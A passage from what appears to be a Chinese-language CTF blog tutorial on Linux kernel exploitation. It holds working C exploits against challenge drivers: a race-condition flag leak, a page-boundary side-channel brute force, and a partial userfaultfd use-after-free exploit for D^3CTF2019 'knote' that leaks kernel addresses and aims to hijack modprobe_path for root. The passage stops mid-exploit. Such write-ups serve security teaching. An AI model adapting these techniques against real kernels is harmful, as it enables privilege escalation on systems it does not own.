class="hljs-type">int</span> fd,addr_fd,test_fd;<br>    <span class="hljs-type">char</span> * temp,*locate_addr_str;<br>    fd=open(<span class="hljs-string">&quot;/dev/baby&quot;</span>,O_RDWR);<br>    ioctl(fd,<span class="hljs-number">0x6666</span>);<br>    system(<span class="hljs-string">&quot;dmesg|grep flag &gt;addr.txt&quot;</span>);<br>    addr_fd=open(<span class="hljs-string">&quot;./addr.txt&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span>(addr_fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]err open addr.txt!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    temp=(<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    temp[read(addr_fd,temp,<span class="hljs-number">0x40</span>)]=<span class="hljs-string">&#x27;\0&#x27;</span>;<br>    locate_addr_str=<span class="hljs-built_in">strstr</span>(temp,<span class="hljs-string">&quot;Your flag is at &quot;</span>)+ <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Your flag is at &quot;</span>);;<br>    real_addr = strtoull(locate_addr_str,locate_addr_str+<span class="hljs-number">0x10</span>, <span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag_addr=%llx\n&quot;</span>,real_addr);<br><br>    pthread_create(&amp;tidp, <span class="hljs-literal">NULL</span>, competetionThread, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span>(status)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;competetion_times;i++)<br>        &#123;<br>            flag.flag_addr=buf;<br>            ioctl(fd,<span class="hljs-number">0x1337</span>,&amp;flag);<br>        &#125;<br>        system(<span class="hljs-string">&quot;dmesg|grep flag &gt; result.txt&quot;</span>);<br>        test_fd=open(<span class="hljs-string">&quot;./result.txt&quot;</span>,O_RDONLY);<br>        read(test_fd,temp,<span class="hljs-number">0x1000</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(temp,<span class="hljs-string">&quot;flag&#123;&quot;</span>))<br>            status=<span class="hljs-number">0</span>;<br>    &#125;<br>    <br>    pthread_cancel(tidp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]successful competetion\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;dmesg|grep flag&quot;</span>);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2-1684499630049.png" alt="2"></p><h4 id="0x03解法2：测信道攻击">0x03解法2：测信道攻击</h4><p>由于是 flag 是硬编码的，并且是检查方法是逐字节比较，因此可以逐字节爆破来得到 flag。</p><p>方法是将待爆破的字节放在 mmap 申请的内存页末位，此时下一字节位于不可读写的用户态空间。</p><p>如果我们成功的猜对了一个字节，就会继续往下读，下一字节位于不可读写的用户态空间，读取会导致<code>kernel panic</code>，从而可以判断是否爆破的一个字节正确。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">|------------------------------|    &lt;---- unallocated page</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|   |</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |    &lt;---- page alloc by mmap</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                   flag&#123;.....X|</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |    &lt;---- unallocated page</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>这里直接拿arttnba3师傅的脚本，用main的argv[1]来传变量，不用每次编译进行爆破</p><p>关于远端传文件由于本人还没试过，看起来是很麻烦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc cexindao.c -static -o cexindao</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * flag_addr;<br>    <span class="hljs-type">int</span> flag_len;<br>&#125;flag = &#123; .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd, flag_len;<br>    <span class="hljs-type">char</span> * buf, *flag_addr;<br><br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;usage: ./exp flag&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    flag_len = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>    <br>    fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    flag_addr = buf + <span class="hljs-number">0x1000</span> - flag_len;<br>    <span class="hljs-built_in">memcpy</span>(flag_addr, argv[<span class="hljs-number">1</span>], flag_len);<br>    flag.flag_addr = flag_addr;<br>    ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="07-userfaultfd">07.userfaultfd</h2><p>userfaultfd是一个常规的与缺页处理相关的系统调用，</p><p>我们可以<strong>利用这个机制控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高</strong></p><h3 id="D-3CTF2019-knote">D^3CTF2019 - knote</h3><h4 id="0x01程序分析-5">0x01程序分析</h4><p>开启了smep/smap,开启了kaslr</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>cd /home/ctf<br>qemu-system-x86_64 \<br>-m 128M \<br>-kernel ./bzImage \<br>-initrd  ./rootfs.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot; \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic \<br>-monitor /dev/null \<br>-smp cores=2,threads=1 \<br>-cpu qemu64,+smep,+smap<br></code></pre></td></tr></table></figure><p>只挂载note.ko,惯例漏洞在这</p><p>ida可以分析出ioctl第三个参数传入的结构为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">chunk</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span>&#123;</span><br>        <span class="hljs-type">size_t</span> index;<br>        <span class="hljs-type">size_t</span> size;<br>    &#125;<br>    <span class="hljs-type">char</span> *ptr;<br>&#125;mychunk;<br></code></pre></td></tr></table></figure><p>驱动大体实现了堆菜单管理，来分析下</p><h5 id="1-add">1.add</h5><p>大体是遍历找维护数组buf[i]有无空的，如果为空，且size小于0xfff</p><p>则kmalloc分配size大小的内存，且填入维护数组</p><p>这里加了写锁，也就是独占锁，写的时候只能一个进程写。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">buf[i].<span class="hljs-attribute">ptr</span>=分配内存的地址<br>buf[i].<span class="hljs-attribute">size</span>=内存的大小<br></code></pre></td></tr></table></figure><h5 id="2-delete">2.delete</h5><p>就是kfree释放掉申请的内存，维护数组buf[i]置零</p><p>这里也加了写锁。</p><p>buf[i].ptr=0<br>buf[i].size=0</p><h5 id="3-edit">3.edit</h5><p>就是正常的用维护数组buf[i]当参数，然后用copy_user_generic_unrolled函数拷贝内存</p><p>(这个函数是_copy_to_user最底层实现，我们可以理解为这是编译器优化的结果？)</p><p>就是在用户空间往内核空间写数据</p><p>值得注意的是这个edit没有加写锁，所以存在条件竞争</p><h5 id="4-get">4.get</h5><p>这里也没加写锁</p><p>与edit作用相反，从内核空间向用户空间写数据</p><h4 id="0x02利用方法">0x02利用方法</h4><h5 id="1-UserFaultFd条件竞争">1.UserFaultFd条件竞争</h5><p>在父进程对get使用UserFaultFd，来条件竞争，在父进程使get阻塞时，子进程释放object，分配到tty_struct，以泄露内核基址</p><h5 id="2-劫持modprobe-path">2.劫持modprobe_path</h5><p>在父进程对edit使用UserFaultFd，来条件竞争，劫持 freelist 从而构造内核任意地址写，劫持call_modprobe()中的modprobe_path为我们的恶意程序（/getshell），用execve执行非法文件，触发以root权限执行来cat flag 并起一个shell</p><h4 id="0x03Exp">0x03Exp</h4><p>基本上是跟着<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#%E4%BE%8B%E9%A2%98%EF%BC%9AD-3CTF2019-knote">arttnba3</a>师傅的exp打了一遍</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DO_SAK_WORK 0xffffffff815d4ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MODPROBE_PATH 0xffffffff8245c5c0</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> cat_flag[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br><span class="hljs-type">int</span> knote_fd;<br><span class="hljs-type">size_t</span> modprobe_path;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-type">size_t</span> size;<br>        <span class="hljs-type">size_t</span> index;<br>    &#125;;<br>    <span class="hljs-type">char</span> * buf;<br>&#125; Chunk;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">chunkAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>&#123;<br>    Chunk chunk=&#123;<br>        .size=size,<br>    &#125;;<br>    ioctl(knote_fd,<span class="hljs-number">0x1337</span>,&amp;chunk);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">chunkEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> index, <span class="hljs-type">char</span> * buf)</span>&#123;<br>    Chunk chunk=&#123;<br>        .index=index,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(knote_fd,<span class="hljs-number">0x8888</span>,&amp;chunk);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">chunkGet</span><span class="hljs-params">(<span class="hljs-type">size_t</span> index,<span class="hljs-type">char</span> *buf)</span>&#123;<br>    Chunk chunk=&#123;<br>        .index=index,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(knote_fd,<span class="hljs-number">0x2333</span>,&amp;chunk);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">chunkDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> index)</span>&#123;<br>    Chunk chunk=&#123;<br>        .index=index,<br>    &#125;;<br>    ioctl(knote_fd,<span class="hljs-number">0x6666</span>,&amp;chunk);<br>&#125;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>; <br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> * buf1;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> * buf2;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        sleep(<span class="hljs-number">8</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-comment">// create reverse shell file</span><br>    fd = open(<span class="hljs-string">&quot;/getshell&quot;</span>, O_RDWR | O_CREAT);<br>    write(fd, cat_flag, <span class="hljs-keyword">sizeof</span>(cat_flag));<br>    close(fd);<br>    system(<span class="hljs-string">&quot;chmod +x /getshell&quot;</span>);<br><br>    saveStatus();<br>    page_size=sysconf(_SC_PAGE_SIZE);<br>    sleep(<span class="hljs-number">1</span>);<br>    buf1=mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    buf2=mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (buf1 == MAP_FAILED)<br>        errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    registerUserFaultFd(buf1, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br>    registerUserFaultFd(buf2, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>    knote_fd=open(<span class="hljs-string">&quot;/dev/knote&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(knote_fd&lt;<span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;Open knote Failed!&quot;</span>);<br>    <span class="hljs-comment">// read saved data(if existed)</span><br>    fd = open(<span class="hljs-string">&quot;kernel_addr.txt&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (fd &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        close(fd);<br>        FILE* file = fopen(<span class="hljs-string">&quot;/kernel_addr.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-keyword">if</span> (file)<br>        &#123;<br>            <span class="hljs-built_in">fscanf</span>(file, <span class="hljs-string">&quot;%llx %llx&quot;</span>, &amp;kernel_base, &amp;kernel_offset);<br>            <span class="hljs-keyword">goto</span> exploit;<br>        &#125;<br>    &#125;<br>    <br>    chunkAdd(TTY_STRUCT_SIZE);<br>    <span class="hljs-type">pid_t</span> fpid = fork();<br>    <span class="hljs-keyword">if</span> (fpid&lt;<span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;Fork child Failed!&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(fpid==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is a child process!&quot;</span>);<br>        sleep(<span class="hljs-number">2</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;child start&quot;</span>);<br>        chunkDel(<span class="hljs-number">0</span>);<br>        sleep(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">int</span> fd_tty = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Object free and tty got open. Backing parent thread...&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is a parent process!&quot;</span>);<br>        chunkGet(<span class="hljs-number">0</span>,buf1);<span class="hljs-comment">//Pause here,waitting </span><br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">0x2e0</span>/<span class="hljs-number">8</span>;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[leak_data]: %d : %p\n&quot;</span>,i,*((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(buf1)+i));<br>        <br>    <span class="hljs-keyword">if</span> (*(buf1+<span class="hljs-number">86</span>))<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Successfully leak!&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        errExit(<span class="hljs-string">&quot;Fail to leak&quot;</span>);<br>    <br>    